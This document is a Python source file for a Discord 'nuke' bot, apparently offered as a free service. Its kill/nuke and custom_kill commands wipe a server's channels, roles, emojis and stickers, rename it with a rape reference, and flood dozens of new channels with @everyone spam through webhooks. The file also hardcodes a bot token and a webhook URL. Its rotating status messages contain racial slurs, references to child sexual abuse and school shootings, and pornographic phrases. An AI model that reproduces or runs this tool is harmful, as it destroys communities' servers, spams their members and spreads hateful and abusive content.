import discord
from discord.ext import commands
import requests
import asyncio
import aiohttp
import json
import random
import aiohttp
import discord
from discord.ext import commands
import urllib.request
import json
import requests
import time
from discord import Embed
from flask import Flask, request, abort
from discord.ext import commands, tasks

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")
log_join = 'https://discord.com/api/webhooks/1191656583822843924/LA3yfEdUy68W6C9tM_8yb3D3HrF2TWFBOGGj8B7uHZ9_gUjavwe2vH5memUlhHbddn1x'
TOKEN = 'MTE4NzQzODU0NTg3NTUyMTYwNw.G0gwkg.-jBak42olOy8jKCiBQFHJ6PmNiAyPriyvi6z64'
headers = {"Authorization": f"Bot {TOKEN}"} 
WEBHOOK_NAMES = ["TOPC ON TOP"]
CHANNEL_NAMES = ["join-topc"]
spam = f"@everyone @here discord.gg/ixnf \n\n****Topc was here****\n\nJoin the server for the bot its ****free**** do +invite in 「🔨」commands"
target_server_id = 69
max = 40
boost = "You need to boost https://discord.gg/ixnf"
whitelist = 232323











def is_user_in_boosters(user_id):
    with open('boosters.txt', 'r') as file:
        booster_ids = [line.strip() for line in file.readlines()]

    return str(user_id) in booster_ids


def save_custom_info(user_id, channel_names, message_content):
    with open("settings.txt", "a") as file:
        file.write(f"{user_id}::{','.join(channel_names)}::{message_content}\n")


def remove_custom_info(user_id):
    with open("settings.txt", "r") as file:
        lines = file.readlines()

    with open("settings.txt", "w") as file:
        for line in lines:
            data = line.strip().split("::")
            if len(data) == 3 and data[0] == str(user_id):
                continue  #
            file.write(line)


def get_custom_info(user_id):
    with open("settings.txt", "r") as file:
        lines = file.readlines()

    for line in lines:
        data = line.strip().split("::")
        if len(data) == 3 and data[0] == str(user_id):
            return data[1].split(','), data[2]

    return None

@bot.event
async def on_ready():
    print(f'{bot.user.name}')
    change_status.start()
    check_and_leave.start()
 

@tasks.loop(seconds=1)
async def check_and_leave():
    if len(bot.guilds) >= max:
        for guild in bot.guilds:
            if guild.id != whitelist:
                await guild.leave()

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f'{latency}')
@tasks.loop(minutes=1)
async def change_status():
    statuses = [
        discord.Game(name="touching kids"),
        discord.Streaming(name="killing niggers", url="http://twitch.tv/topcdiscord"),
        discord.Streaming(name="WATCHING PRON", url="http://twitch.tv/topcdiscord"),
        discord.Game(type=discord.ActivityType.listening, name="MOANING"),
        discord.Activity(type=discord.ActivityType.watching, name="GAY PRON"),
        discord.Activity(type=discord.ActivityType.watching, name="FURRYS"),
        discord.Activity(type=discord.ActivityType.watching, name="ANDREW-TATE"),
        discord.Activity(type=discord.ActivityType.watching, name="Youtube.com/ixnf"),
        discord.Activity(type=discord.ActivityType.watching, name="children dieing"),
        discord.Activity(type=discord.ActivityType.watching, name="26 leak videos"),
        discord.Activity(type=discord.ActivityType.watching, name="daddy jerking off"),
        discord.Activity(type=discord.ActivityType.watching, name="nukeing videos"),
        discord.Game(type=discord.ActivityType.listening, name="MOANING"),
        discord.Game(type=discord.ActivityType.listening, name="2023 LOUEST MOANS"),
        discord.Game(type=discord.ActivityType.listening, name="SCHOOL SHOOTINGS"),
        discord.Game(type=discord.ActivityType.listening, name="NTTS VIDEOS🧠"),
        discord.Game(type=discord.ActivityType.listening, name="gay sex"),
        discord.Game(type=discord.ActivityType.listening, name="2023 BIGEST CUM SHOTS"),
        discord.Game(type=discord.ActivityType.listening, name="HOW TO NUKE 2024"),
        discord.Game(type=discord.ActivityType.listening, name="HOW TO GET A REBOT CARD"),
        discord.Game(type=discord.ActivityType.listening, name="2023 BIGEST DICKS"),
        discord.Game(type=discord.ActivityType.watching, name="topc in shower"),
        discord.Game(type=discord.ActivityType.listening, name="how to cum"),
        discord.Game(type=discord.ActivityType.listening, name="how to tell topc i dont like the name tuxy"),
        discord.Game(type=discord.ActivityType.listening, name="fornite pron"),

    ]

    new_status = random.choice(statuses)
    await bot.change_presence(activity=new_status)
@bot.event
async def on_guild_join(guild):
    real_members = [member for member in guild.members if not member.bot]

    if len(real_members) < 5:
        await send_embed_to_inviter(guild)
        await guild.leave()

async def send_embed_to_inviter(guild):
    inviter = await get_inviter(guild)

    if inviter:
        embed = discord.Embed(
            title='ERROR',
            description="You need at least 5 members to invite the bot",
            color=discord.Color.red()
        )

        try:
            await inviter.send(embed=embed)
        except discord.Forbidden:
            pass

async def get_inviter(guild):
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
        return entry.user if entry else None







@bot.command()
@commands.cooldown(1, 400, commands.BucketType.guild)
@commands.cooldown(1, 800, commands.BucketType.user)
async def custom_kill(ctx):
    try:
        if ctx.guild and ctx.guild.id == target_server_id:
            return
        user = ctx.author
        if not is_user_in_boosters(str(user.id)):
            await ctx.send(f"You need to boost {invite}")
            return
        custom_info = get_custom_info(user.id)
        if not custom_info:
            await ctx.send("You need to set custom information using .settings before using this command.")
            return
        channel_names, message_content = custom_info
        guild = ctx.guild
        new_server_name = f"RAPED by {user.name}"
        await guild.edit(name=new_server_name)
        delete_channel_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_channel_tasks)
        create_channel_tasks = []
        for name in channel_names:
            if name:
                for _ in range(35):
                    try:
                        create_channel_tasks.append(guild.create_text_channel(name))
                    except discord.HTTPException:
                        pass
        created_channels = await asyncio.gather(*create_channel_tasks)
        async def send_messages_to_channel(channel, webhook):
            try:
                for _ in range(35):
                    await webhook.send(f"{message_content}\n @everyone @here Topc .gg/ixnf")
                    await asyncio.sleep(0.1)  
            except discord.HTTPException:
                pass
        webhook_creation_tasks = [channel.create_webhook(name="premium .gg/ixnf") for channel in created_channels]
        webhooks = await asyncio.gather(*webhook_creation_tasks)
        send_tasks = []
        for channel, webhook in zip(created_channels, webhooks):
            send_tasks.append(send_messages_to_channel(channel, webhook))
        await asyncio.gather(*send_tasks)
        for role in guild.roles:
            try:
                await role.delete()
            except discord.HTTPException:
                pass
        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass
        for sticker in guild.stickers:
            try:
                await sticker.delete()
            except discord.HTTPException:
                pass
    except Exception as e:
        pass  



@bot.command(name='kill', aliases=['nuke'])
@commands.cooldown(1, 1000, commands.BucketType.guild)
async def kill(ctx):
    try:
        guild = ctx.guild

        try:
            with open('topc.png', 'rb') as icon_file:
                await guild.edit(name='Topc', icon=icon_file.read())
        except Exception as icon_error:
            pass

 
        try:
            tasks = [delete_channel(channel) for channel in guild.channels]
            await asyncio.gather(*tasks)
        except Exception as delete_error:
            pass

        
        try:
            created_channels_with_webhooks = await create_channels_with_webhooks(guild)
            channels, webhooks = zip(*created_channels_with_webhooks)
        except Exception as create_error:
            channels, webhooks = [], []

   
        try:
            await asyncio.gather(*(send_messages_to_channel(channel, webhook) for channel, webhook in zip(channels, webhooks)))
        except Exception as send_error:
            pass

   
        try:
            await clean_guild_emojis(guild)
            await clean_guild_stickers(guild)
        except Exception as clean_error:
            pass

    
        try:
            for role in guild.roles:
                await role.delete()
        except Exception as role_error:
            pass

    except Exception as e:
        pass

async def delete_channel(channel):
    try:
        await channel.delete()
        await asyncio.sleep(1) 
    except Exception as delete_error:
        pass

async def create_channels_with_webhooks(guild):
    try:
        channels = [f'{random.choice(CHANNEL_NAMES)}' for i in range(1, 31)]
        created_channels_with_webhooks = await asyncio.gather(
            *(create_channel_with_webhook(guild, name) for name in channels)
        )

        return created_channels_with_webhooks
    except Exception:
        return []

async def create_channel_with_webhook(guild, name):
    try:
        channel = await guild.create_text_channel(name)
        webhook_name = random.choice(WEBHOOK_NAMES)
        webhook = await create_webhook(channel, webhook_name)
        return channel, webhook
    except Exception:
        return None

async def create_webhook(channel, name):
    try:
        headers = {"Authorization": f"Bot {TOKEN}"}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v10/channels/{channel.id}/webhooks",
                                    json={"name": name}, headers=headers) as response:
                data = await response.json()
                if 'url' in data:
                    webhook = discord.Webhook.from_url(data['url'], session=session)
                    return webhook
                else:
                    return None
    except Exception:
        return None

async def send_messages_to_channel(channel, webhook):
    try:
        if webhook is None:
            return

        channel_id = channel.id

        async with aiohttp.ClientSession() as session:
            webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
            tasks = [send_webhook_message(session, webhook_url, {"content": f"{spam}"}) for _ in range(45)]

            for task in tasks:
                await asyncio.gather(task, asyncio.sleep(0.1))

    except Exception:
        pass

async def send_webhook_message(session, webhook_url, payload):
    try:
        headers = {'Content-Type': 'application/json', "Authorization": f"Bot {TOKEN}"}
        async with session.post(webhook_url, data=json.dumps(payload), headers=headers) as response:
            if response.status != 204:
                raise Exception(f"Failed to send message to webhook. Status: {response.status}")

    except Exception:
        pass

async def clean_guild_emojis(guild):
    try:
        for emoji in guild.emojis:
            await emoji.delete()
    except Exception:
        pass

async def clean_guild_stickers(guild):
    try:
        for sticker in await guild.fetch_stickers():
            await sticker.delete()
    except Exception:
        pass





@bot.command()
async def settings(ctx):
    if ctx.guild and ctx.guild.id == target_server_id:
        return

    user = ctx.author
    if not is_user_in_boosters(str(user.id)):
        await ctx.send(f"{boost}")
        return

    await user.send("Tell me what I should call the channels")

    def check(message):
        return message.author == user and message.channel.type == discord.ChannelType.private

    try:
        response = await bot.wait_for('message', check=check, timeout=300)
        channel_names = [name.strip() for name in response.content.split(',') if name.strip()]

        if not channel_names:
            return

        await user.send("What message do you want me to send to all channels also put your own link in the message")
        message_response = await bot.wait_for('message', check=check, timeout=300)
        message_content = message_response.content

      
        remove_custom_info(user.id)

        
        save_custom_info(user.id, channel_names, message_content)

        await user.send("Saved do .custom_kill in the server you want to n1ke with the main bot +invite in commads")

    except asyncio.TimeoutError:
        return
    













@kill.error
async def kill(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `wait{remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass









bot.run(TOKEN)
